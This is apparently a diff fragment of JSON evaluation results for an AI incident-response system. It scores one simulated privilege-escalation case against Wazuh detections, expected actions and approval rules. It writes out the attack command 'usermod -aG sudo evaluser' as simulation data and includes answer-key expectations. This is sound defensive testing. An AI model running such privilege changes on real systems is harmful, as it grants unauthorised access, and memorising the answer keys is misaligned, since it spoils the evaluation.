+            "type": "IPV4",
+            "value": "172.19.0.7"
+          }
+        ],
+        "skippedIocs": [],
+        "excludedIocs": [
+          {
+            "type": "IPV4",
+            "value": "172.19.0.5",
+            "reason": "Endpoint identity of the alerting agent (agent.name / agent.ip)"
+          }
+        ],
+        "window": {
+          "start": "2026-10-01T06:05:30.212Z",
+          "end": "2026-10-01T06:05:45.277Z"
+        }
+      },
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    },
+    {
+      "caseId": "TC-10",
+      "attackType": "ACCOUNT_COMPROMISE",
+      "attackName": "Privilege Escalation",
+      "severity": "critical",
+      "risk": null,
+      "incidentId": "c342572b-8166-4c46-bbe4-8cd25ccb58c6",
+      "alertId": "5d61bd93-dc36-439b-be60-af6133c347f8",
+      "investigationId": "d4342861-79e0-4085-80d4-9d064f2557cb",
+      "recommendationId": "17f02699-8288-4f91-8a78-35697bcf0080",
+      "playbookCode": "PB-ACCOUNT-COMPROMISE",
+      "decisionId": "1a0089a7-966d-4bcf-94d8-eb5d50fdaf9f",
+      "responseTicketId": "74bd5986-81de-465c-9183-b58e75f9c01b",
+      "verificationId": null,
+      "recommendationStatus": "VALIDATED",
+      "compliance": {
+        "attackAlignment": true,
+        "evidenceSupport": true,
+        "knowledgeValidity": true,
+        "policyCompliance": true,
+        "playbookAlignment": true,
+        "approvalCorrectness": true,
+        "compliant": true,
+        "failedChecks": []
+      },
+      "recommendationCompliance": "COMPLIANT",
+      "investigationStartAt": "2026-10-01T06:05:56.967Z",
+      "recommendationAt": "2026-10-01T06:06:46.455Z",
+      "decisionAt": "2026-10-01T06:06:46.509Z",
+      "investigationTimeSeconds": 49.49,
+      "timeToDecisionSeconds": 0.05,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": false,
+        "recommendationCreated": true,
+        "recommendationValidated": true,
+        "policyEvaluated": true,
+        "decisionCompleted": true,
+        "responseCompleted": true,
+        "verificationCompleted": false,
+        "rehuntExecuted": false
+      },
+      "workflowCompleted": false,
+      "finalStatus": "open",
+      "verificationMode": "NONE",
+      "verificationResult": null,
+      "rehuntRound": null,
+      "recommendationAttemptCount": 1,
+      "invalidOutputCount": 0,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [
+        "(ground-truth note) Stock Wazuh 4.9.2 has NO decoder/rule for `usermod -aG sudo` (only useradd 5902/T1136 and FIM 550 fire). Detection requires the custom rule 100350 — a ruleset gap, not a VIGIX defect."
+      ],
+      "notes": "",
+      "mode": "CUSTOM_RULE_REAL_ACTION",
+      "telemetry": "REAL_ACTION_CUSTOM_RULE",
+      "simulation": {
+        "caseId": "TC-10",
+        "startedAt": "2026-10-01T06:05:45.378Z",
+        "endedAt": "2026-10-01T06:05:48.632Z",
+        "telemetry": "REAL_ACTION_CUSTOM_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.6",
+          "endpointIp": "172.19.0.5",
+          "testServerIp": "172.19.0.7",
+          "user": "evaluser",
+          "oldPrivilege": "standard user (no sudo)",
+          "newPrivilege": "member of group sudo",
+          "command": "usermod -aG sudo evaluser"
+        },
+        "notes": [
+          "Test-only account evaluser; removed in cleanup."
+        ]
+      },
+      "wazuh": {
+        "indexerDocId": "2aQR9qABGgCGM5y0vEHZ",
+        "alertId": "1790834749.282641",
+        "timestamp": "2026-10-01T06:05:49.420+0000",
+        "ruleId": "100350",
+        "level": 14,
+        "description": "VIGIX-EVAL: user added to a privileged group (privilege change)",
+        "mitre": [
+          "T1098"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": null,
+        "stockRule": false,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 4.04
+      },
+      "groundTruth": {
+        "caseId": "TC-10",
+        "ruleId": "100350",
+        "attackName": "Privilege Escalation",
+        "attackType": "ACCOUNT_COMPROMISE",
+        "mode": "CUSTOM_RULE_REAL_ACTION",
+        "simulation": "Real `useradd evaluser` then `usermod -aG sudo evaluser` on the endpoint; auth.log line decoded by the custom vigix-usermod decoder",
+        "expectedWazuh": {
+          "ruleId": "100350",
+          "level": 14,
+          "stockRule": false
+        },
+        "expectedSeverity": "critical",
+        "expectedMitre": [
+          "T1098"
+        ],
+        "expectedIocs": [
+          {
+            "type": "user",
+            "value": "evaluser"
+          }
+        ],
+        "allowedActions": [
+          "ACT-DISABLE-ACCOUNT",
+          "ACT-BLOCK-SOURCE-IP",
+          "ACT-ISOLATE-ENDPOINT",
+          "ACT-RESET-CREDENTIAL",
+          "ACT-REVOKE-SESSION"
+        ],
+        "expectedActions": [
+          "ACT-DISABLE-ACCOUNT"
+        ],
+        "expectedTargets": [
+          "evaluser"
+        ],
+        "expectedPlaybook": "PB-ACCOUNT-COMPROMISE",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": [
+          "Stock Wazuh 4.9.2 has NO decoder/rule for `usermod -aG sudo` (only useradd 5902/T1136 and FIM 550 fire). Detection requires the custom rule 100350 — a ruleset gap, not a VIGIX defect."
+        ]
+      },
+      "interventions": [],
+      "observations": [
+        "REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA \"No supported IOC is available to query.\" — no verification, incident not resolved"
+      ],
+      "timeline": {
+        "simulationStart": "2026-10-01T06:05:45.378Z",
+        "wazuhAlertTimestamp": "2026-10-01T06:05:49.420+0000",
+        "alertReceivedByVigix": "2026-10-01T06:05:56.931Z",
+        "incidentOpened": "2026-10-01T06:05:56.961Z",
+        "investigationStart": "2026-10-01T06:05:56.967Z",
+        "recommendationCreated": "2026-10-01T06:06:46.455Z",
+        "irDecision": "2026-10-01T06:06:46.509Z",
+        "responseCompleted": "2026-10-01T06:06:49.560Z",
+        "verificationAt": null,
+        "detectionLatencySeconds": 4.04,
+        "ingestToRecommendationSeconds": 49.53
+      },
+      "iocRecall": {
+        "expected": 1,
+        "found": 1,
+        "missing": []
+      },
+      "actionMatch": {
+        "expectedActions": [
+          "ACT-DISABLE-ACCOUNT"
+        ],
+        "actualActions": [
+          "ACT-DISABLE-ACCOUNT"
+        ],
+        "expectedActionHit": true,
+        "actualTargets": [
+          "evaluser"
+        ],
+        "expectedTargetHit": true
+      },
+      "verificationDetail": null,
+      "rehuntError": "REHUNT_INSUFFICIENT_CRITERIA",
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    }
+  ]
+}
